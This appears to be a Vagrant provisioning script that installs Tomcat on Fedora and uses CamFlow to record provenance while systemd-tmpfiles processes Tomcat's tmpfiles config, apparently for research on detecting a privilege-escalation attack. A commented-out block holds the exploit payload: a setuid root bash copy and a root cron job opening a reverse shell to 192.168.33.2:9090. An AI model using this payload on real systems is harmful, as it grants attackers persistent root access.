sudo loadkeys us

cd /home/vagrant

# cd /usr/share/
sudo wget "ftp://mirror.switch.ch/pool/4/mirror/fedora/linux/releases/25/Server/x86_64/os/Packages/t/tomcat-8.0.36-2.fc25.noarch.rpm"
sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/25/Everything/x86_64/os/Packages/t/tomcat-webapps-8.0.36-2.fc25.noarch.rpm

sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/25/Everything/x86_64/os/Packages/t/tomcat-lib-8.0.36-2.fc25.noarch.rpm
sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/25/Everything/x86_64/os/Packages/t/tomcat-el-3.0-api-8.0.36-2.fc25.noarch.rpm
sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/25/Everything/x86_64/os/Packages/t/tomcat-jsp-2.3-api-8.0.36-2.fc25.noarch.rpm
sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/25/Everything/x86_64/os/Packages/t/tomcat-servlet-3.1-api-8.0.36-2.fc25.noarch.rpm
sudo dnf install -y tomcat-servlet-3.1-api-8.0.36-2.fc25.noarch.rpm tomcat-jsp-2.3-api-8.0.36-2.fc25.noarch.rpm tomcat-el-3.0-api-8.0.36-2.fc25.noarch.rpm tomcat-lib-8.0.36-2.fc25.noarch.rpm tomcat-8.0.36-2.fc25.noarch.rpm tomcat-webapps-8.0.36-2.fc25.noarch.rpm


# fedora 24 tomcat
# sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/24/Everything/x86_64/os/Packages/t/tomcat-8.0.32-4.fc24.noarch.rpm
# sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/24/Everything/x86_64/os/Packages/t/tomcat-lib-8.0.32-4.fc24.noarch.rpm
# sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/24/Everything/x86_64/os/Packages/t/tomcat-el-3.0-api-8.0.32-4.fc24.noarch.rpm
# sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/24/Everything/x86_64/os/Packages/t/tomcat-jsp-2.3-api-8.0.32-4.fc24.noarch.rpm
# sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/24/Everything/x86_64/os/Packages/t/tomcat-servlet-3.1-api-8.0.32-4.fc24.noarch.rpm
# sudo wget ftp://195.220.108.108/linux/fedora/linux/releases/24/Everything/x86_64/os/Packages/t/tomcat-webapps-8.0.32-4.fc24.noarch.rpm

# sudo dnf install -y tomcat-servlet-3.1-api-8.0.32-4.fc24.noarch.rpm tomcat-jsp-2.3-api-8.0.32-4.fc24.noarch.rpm tomcat-el-3.0-api-8.0.32-4.fc24.noarch.rpm tomcat-lib-8.0.32-4.fc24.noarch.rpm tomcat-8.0.32-4.fc24.noarch.rpm
# sudo dnf install -y tomcat-webapps-8.0.32-4.fc24.noarch.rpm



sudo systemctl enable tomcat
sudo systemctl start tomcat

# sudo dnf install -y tomcat-webapps.noarch  # this line will do upgrades and cause tomcat.conf disappear 
# sudo dnf install -y tomcat-servlet-3.1-api.noarch # same this line

# cat<<_eof_>>/usr/lib/tmpfiles.d/tomcat.conf
# C /usr/share/tomcat/rootsh 4770 root root - /usr/bin/bash
# z /usr/share/tomcat/rootsh 4770 root root -
# F /etc/cron.d/tomcatexploit 0644 root root - * * * * * root nohup bash -i >/dev/tcp/192.168.33.2/9090 0<&1 2>&1 & \n\n
# _eof_

# remove the tomcat.pid file to let it be created again by tomcat.conf 
sudo rm /var/run/tomcat.pid

# start tracking target file
sudo camflow --track-file /usr/lib/tmpfiles.d/tomcat.conf propagate

# simulate how the system on boot, other services, cronjobs, startup scripts trigger the run of the target file
sudo /usr/bin/systemd-tmpfiles --create

# sudo cp /tmp/audit.log /vagrant/prov-data/immiediate-before-normal-after-run-tomcat-conf.log

# give camflow some time for provenance data to be written in audit.log
# sleep 30

# get data before using tomcat as a server 
# sudo cp /tmp/audit.log /vagrant/prov-data/before-normal-after-run-tomcat-conf.log
#sudo /sbin/shutdown -r now

